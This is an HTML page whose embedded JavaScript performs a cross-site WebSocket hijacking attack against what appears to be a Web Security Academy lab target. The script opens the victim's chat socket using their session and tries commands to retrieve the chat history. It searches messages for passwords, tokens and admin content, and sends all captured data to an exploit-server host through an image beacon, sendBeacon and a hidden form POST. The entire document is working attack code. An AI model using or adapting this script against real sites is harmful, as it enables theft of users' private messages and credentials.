<!DOCTYPE html>
<html>
<head>
    <title>WebSocket CSRF Exploit V2</title>
</head>
<body>
    <h1>WebSocket CSRF Attack V2</h1>
    <div id="status">Connecting to WebSocket...</div>
    <div id="messages"></div>
    
    <script>
        // Target WebSocket URL
        const targetWS = 'wss://0afa00800433f33782e30bbc004f00db.web-security-academy.net/chat';
        
        // Your exploit server for exfiltration
        const exploitServer = 'https://exploit-0a6300d604cff3ab82a60a7901150019.exploit-server.net/exploit';
        
        // Collected data
        let allMessages = [];
        let messageCount = 0;
        
        console.log('[*] Starting WebSocket CSRF attack V2...');
        document.getElementById('status').innerHTML = 'Connecting using victim session...';
        
        try {
            // Connect to the victim's WebSocket
            const ws = new WebSocket(targetWS);
            
            ws.onopen = function() {
                console.log('[+] WebSocket connection established with victim session!');
                document.getElementById('status').innerHTML = '<b style="color:green">Connected! Waiting for chat history...</b>';
                
                // DON'T send any messages immediately - just listen
                // The server should send existing chat history
                
                // Try different commands that might retrieve history
                setTimeout(() => {
                    // Try sending empty message to trigger history
                    ws.send(JSON.stringify({}));
                }, 1000);
                
                setTimeout(() => {
                    // Try requesting history explicitly
                    ws.send(JSON.stringify({action: "history"}));
                }, 2000);
                
                setTimeout(() => {
                    // Try another format
                    ws.send(JSON.stringify({type: "HISTORY"}));
                }, 3000);
                
                setTimeout(() => {
                    // Try READY message
                    ws.send("READY");
                }, 4000);
            };
            
            ws.onmessage = function(event) {
                messageCount++;
                console.log(`[+] Message #${messageCount}:`, event.data);
                
                // Store everything
                allMessages.push({
                    timestamp: new Date().toISOString(),
                    data: event.data,
                    messageNumber: messageCount
                });
                
                // Display on page
                const msgDiv = document.createElement('div');
                msgDiv.style.margin = '5px';
                msgDiv.style.padding = '5px';
                msgDiv.style.border = '1px solid #ccc';
                msgDiv.innerHTML = `<b>Message #${messageCount}:</b> ${event.data}`;
                document.getElementById('messages').appendChild(msgDiv);
                
                // Parse the message
                try {
                    const parsed = JSON.parse(event.data);
                    
                    // Look for arrays (might be history)
                    if (Array.isArray(parsed)) {
                        console.log('[!!!] Found array - likely chat history!');
                        exfiltrateData('chat_history_array', JSON.stringify(parsed));
                    }
                    
                    // Look for history field
                    if (parsed.history || parsed.messages || parsed.chats) {
                        console.log('[!!!] Found history field!');
                        exfiltrateData('chat_history_field', JSON.stringify(parsed));
                    }
                    
                    // Check if it's NOT from "You" (i.e., other users' messages)
                    if (parsed.user && parsed.user !== "You") {
                        console.log(`[!] Message from other user: ${parsed.user}`);
                        exfiltrateData('other_user_message', JSON.stringify(parsed));
                    }
                    
                    // Look for any sensitive data
                    const content = JSON.stringify(parsed).toLowerCase();
                    if (content.includes('password') || 
                        content.includes('secret') || 
                        content.includes('token') ||
                        content.includes('admin') ||
                        content.includes('flag') ||
                        content.includes('carlos')) {
                        console.log('[!] Found potentially sensitive content!');
                        exfiltrateData('sensitive', JSON.stringify(parsed));
                    }
                    
                } catch(e) {
                    // Not JSON - still important
                    if (event.data !== "TYPING" && event.data !== "READY") {
                        exfiltrateData('raw_message', event.data);
                    }
                }
                
                // Always exfiltrate for analysis
                exfiltrateData(`msg_${messageCount}`, event.data);
            };
            
            ws.onerror = function(error) {
                console.log('[-] WebSocket error:', error);
                exfiltrateData('error', JSON.stringify({
                    error: 'WebSocket error',
                    messages_collected: messageCount,
                    all_messages: allMessages
                }));
            };
            
            ws.onclose = function() {
                console.log('[*] WebSocket closed after collecting', messageCount, 'messages');
                document.getElementById('status').innerHTML = `<b>Collected ${messageCount} messages - Exfiltrating...</b>`;
                
                // Final exfiltration
                exfiltrateData('final_dump', JSON.stringify({
                    total_messages: messageCount,
                    all_messages: allMessages,
                    timestamp: new Date().toISOString()
                }));
            };
            
        } catch(e) {
            console.error('[-] Failed:', e);
            exfiltrateData('error', e.toString());
        }
        
        // Exfiltration function
        function exfiltrateData(type, data) {
            console.log(`[*] Exfiltrating ${type}...`);
            
            // Use multiple methods
            try {
                // Image beacon
                const img = new Image();
                img.src = `${exploitServer}?t=${Date.now()}&type=${type}&data=${encodeURIComponent(data)}`;
            } catch(e) {}
            
            try {
                // sendBeacon
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(exploitServer, `type=${type}&data=${encodeURIComponent(data)}`);
                }
            } catch(e) {}
            
            try {
                // Form submission
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = exploitServer;
                form.target = '_blank';
                
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'data';
                input.value = `${type}: ${data}`;
                form.appendChild(input);
                
                document.body.appendChild(form);
                form.submit();
                document.body.removeChild(form);
            } catch(e) {}
        }
        
        // Don't auto-close too quickly - give time to receive messages
        setTimeout(() => {
            console.log('[*] Final collection after 15 seconds');
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.close();
            }
            
            // Final report
            exfiltrateData('final_report', JSON.stringify({
                total_collected: messageCount,
                messages: allMessages,
                url: window.location.href,
                timestamp: new Date().toISOString()
            }));
        }, 15000);
    </script>
</body>
</html>